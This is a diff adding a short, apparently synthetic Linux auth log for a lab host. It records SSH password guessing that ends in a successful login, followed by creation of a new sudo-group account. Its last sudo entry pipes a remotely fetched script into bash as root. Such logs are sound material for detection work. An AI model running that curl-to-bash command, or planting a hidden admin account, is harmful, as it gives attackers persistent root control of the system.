@@ -1,0 +1,40 @@
+Sep 27 09:58:01 srv-web01 CRON[1810]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 27 09:58:01 srv-web01 CRON[1810]: pam_unix(cron:session): session closed for user root
+Sep 27 09:59:12 srv-web01 sshd[1900]: Accepted publickey for ops from 10.10.20.33 port 51022 ssh2: ED25519 SHA256:Qm7kLd0e3xkX1pZq0m7VbHc3aDsn8hQx1vJc3jN7f9A
+Sep 27 09:59:12 srv-web01 sshd[1900]: pam_unix(sshd:session): session opened for user ops(uid=1000) by (uid=0)
+Sep 27 09:59:12 srv-web01 systemd-logind[612]: New session 41 of user ops.
+Sep 27 09:59:40 srv-web01 sudo[1933]:      ops : TTY=pts/0 ; PWD=/home/ops ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Sep 27 09:59:40 srv-web01 sudo[1933]: pam_unix(sudo:session): session opened for user root(uid=0) by ops(uid=1000)
+Sep 27 09:59:41 srv-web01 sudo[1933]: pam_unix(sudo:session): session closed for user root
+Sep 27 10:00:05 srv-web01 sshd[2001]: Invalid user oracle from 10.10.99.10 port 40001
+Sep 27 10:00:05 srv-web01 sshd[2001]: Failed password for invalid user oracle from 10.10.99.10 port 40001 ssh2
+Sep 27 10:00:06 srv-web01 sshd[2001]: Connection closed by invalid user oracle 10.10.99.10 port 40001 [preauth]
+Sep 27 10:00:07 srv-web01 sshd[2003]: Failed password for root from 10.10.99.10 port 40002 ssh2
+Sep 27 10:00:08 srv-web01 sshd[2005]: Failed password for root from 10.10.99.10 port 40003 ssh2
+Sep 27 10:00:09 srv-web01 sshd[2007]: Invalid user admin from 10.10.99.10 port 40004
+Sep 27 10:00:09 srv-web01 sshd[2007]: Failed password for invalid user admin from 10.10.99.10 port 40004 ssh2
+Sep 27 10:00:10 srv-web01 sshd[2009]: Invalid user test from 10.10.99.10 port 40005
+Sep 27 10:00:10 srv-web01 sshd[2009]: Failed password for invalid user test from 10.10.99.10 port 40005 ssh2
+Sep 27 10:00:11 srv-web01 sshd[2011]: Failed password for ubuntu from 10.10.99.10 port 40006 ssh2
+Sep 27 10:00:12 srv-web01 sshd[2013]: Failed password for aysel from 10.10.99.10 port 40007 ssh2
+Sep 27 10:00:13 srv-web01 sshd[2015]: Failed password for aysel from 10.10.99.10 port 40008 ssh2
+Sep 27 10:00:14 srv-web01 sshd[2017]: Invalid user postgres from 10.10.99.10 port 40009
+Sep 27 10:00:14 srv-web01 sshd[2017]: Failed password for invalid user postgres from 10.10.99.10 port 40009 ssh2
+Sep 27 10:00:15 srv-web01 sshd[2019]: Failed password for aysel from 10.10.99.10 port 40010 ssh2
+Sep 27 10:00:16 srv-web01 sshd[2021]: error: maximum authentication attempts exceeded for aysel from 10.10.99.10 port 40011 ssh2 [preauth]
+Sep 27 10:00:17 srv-web01 sshd[2023]: Failed password for aysel from 10.10.99.10 port 40012 ssh2
+Sep 27 10:00:19 srv-web01 sshd[2025]: Accepted password for aysel from 10.10.99.10 port 40013 ssh2
+Sep 27 10:00:19 srv-web01 sshd[2025]: pam_unix(sshd:session): session opened for user aysel(uid=1001) by (uid=0)
+Sep 27 10:00:19 srv-web01 systemd-logind[612]: New session 42 of user aysel.
+Sep 27 10:00:44 srv-web01 sudo[2050]:    aysel : 3 incorrect password attempts ; TTY=pts/1 ; PWD=/home/aysel ; USER=root ; COMMAND=/bin/bash
+Sep 27 10:01:02 srv-web01 sudo[2058]:    aysel : TTY=pts/1 ; PWD=/home/aysel ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash kbtest
+Sep 27 10:01:02 srv-web01 useradd[2060]: new user: name=kbtest, UID=1002, GID=1002, home=/home/kbtest, shell=/bin/bash, from=/dev/pts/1
+Sep 27 10:01:10 srv-web01 sudo[2064]:    aysel : TTY=pts/1 ; PWD=/home/aysel ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo kbtest
+Sep 27 10:01:10 srv-web01 usermod[2066]: add 'kbtest' to group 'sudo'
+Sep 27 10:01:10 srv-web01 usermod[2066]: add 'kbtest' to shadow group 'sudo'
+Sep 27 10:01:30 srv-web01 su[2070]: (to root) aysel on pts/1
+Sep 27 10:01:30 srv-web01 su[2070]: pam_unix(su:session): session opened for user root(uid=0) by aysel(uid=1001)
+Sep 27 10:02:15 srv-web01 sudo[2081]:    aysel : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c curl -s http://files.lab.test/kb-test.sh | bash
+Sep 27 10:03:00 srv-web01 sshd[2025]: pam_unix(sshd:session): session closed for user aysel
+Sep 27 10:03:00 srv-web01 systemd-logind[612]: Removed session 42.
+Sep 27 10:05:01 srv-web01 CRON[2101]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
